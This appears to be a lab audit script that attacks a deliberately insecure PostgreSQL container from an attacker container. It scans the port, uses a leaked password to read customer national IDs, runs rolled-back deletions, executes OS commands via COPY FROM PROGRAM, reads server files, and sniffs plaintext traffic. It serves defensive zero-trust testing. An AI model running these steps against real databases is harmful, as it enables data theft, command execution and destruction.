#!/usr/bin/env bash
# Intentionally insecure lab only. Fake data.
set -uo pipefail
cd "$(dirname "$0")/.."
ATT=zt-baseline-attacker
DB=db
A() { docker exec "$ATT" "$@" </dev/null; }
PSQL() {
  A env PGPASSWORD="$PW" PGSSLMODE="${SSL:-prefer}" \
    PGSSLROOTCERT=/tmp/ca.crt \
    psql -h "$DB" -U app -d appdb -X -v ON_ERROR_STOP=1 -P pager=off "$@"
}
h() { printf '\n==== %s\n' "$1"; }
PW=$(sed -n 's/^DB_PASSWORD=//p' baseline/.env.baseline | head -1)

h "1. Internal port scan"
A nmap -Pn -sV -p 5432 "$DB"

h "2. TLS support and strict client verification"
A timeout 8 openssl s_client -starttls postgres -connect "$DB:5432" 2>&1 | head -6
SSL=verify-full PSQL -c "SELECT 1"

h "3. Leaked static password: plaintext session and sensitive data"
PSQL -c "SELECT current_user, ssl FROM pg_stat_ssl WHERE pid=pg_backend_pid()" \
  -c "SELECT id, full_name, national_id FROM customers LIMIT 3" \
  -c "SELECT rolname, rolsuper, rolvaliduntil FROM pg_roles WHERE rolname='app'"

h "4. Reuse the same password after 40 seconds"
sleep 40
PSQL -c "SELECT 'still valid after 40 s' AS result, current_user"

h "5. Superuser damage: transactional changes rolled back"
PSQL -c "BEGIN" -c "DELETE FROM orders" \
  -c "SELECT count(*) AS orders_left FROM orders" \
  -c "DROP TABLE customers CASCADE" -c "ROLLBACK"
PSQL -c "SELECT count(*) AS orders_after_rollback FROM orders"
PSQL -c "CREATE TEMP TABLE o(t text)" \
  -c "COPY o FROM PROGRAM 'id'" \
  -c "SELECT t AS command_output_inside_db_container FROM o" \
  -c "SELECT pg_read_file('/etc/hostname') AS server_hostname"

h "6. Shared identity and audit configuration"
PSQL -c "SELECT count(*) AS login_roles FROM pg_roles WHERE rolcanlogin" \
  -c "SHOW log_statement" -c "SHOW log_connections" \
  -c "SHOW shared_preload_libraries"
logs=$(docker logs zt-baseline-db 2>&1)
echo "AUDIT matches: $(grep -ac 'AUDIT:' <<<"$logs")"

h "7. Packet capture beside the database"
trap 'docker rm -f zt-baseline-sniffer >/dev/null 2>&1 || true' EXIT
docker rm -f zt-baseline-sniffer >/dev/null 2>&1 || true
docker run -d --name zt-baseline-sniffer \
  --network container:zt-baseline-db \
  --cap-add NET_RAW --cap-add NET_ADMIN \
  zt-baseline-attacker:local \
  timeout 14 tcpdump -n -i any -l -A -s0 'tcp port 5432' >/dev/null
sleep 3
if ! PSQL -c "SELECT full_name, national_id FROM customers LIMIT 2"; then
  echo "FAIL: test query failed; capture comparison is inconclusive"
  exit 1
fi
sleep 12
cap=$(docker logs zt-baseline-sniffer 2>&1)
echo "SQL-text matches: $(grep -ac 'national_id' <<<"$cap")"
echo "Customer-name matches: $(grep -ac 'Amina' <<<"$cap")"
echo "Literal-password matches: $(grep -acF -- "$PW" <<<"$cap")"
echo "Capture summary:"
printf '%s\n' "$cap" | tail -4
printf '%s\n' "$cap" | grep -aE 'SELECT full_name|Amina|AB123456' | head -4
echo "Baseline audit finished."
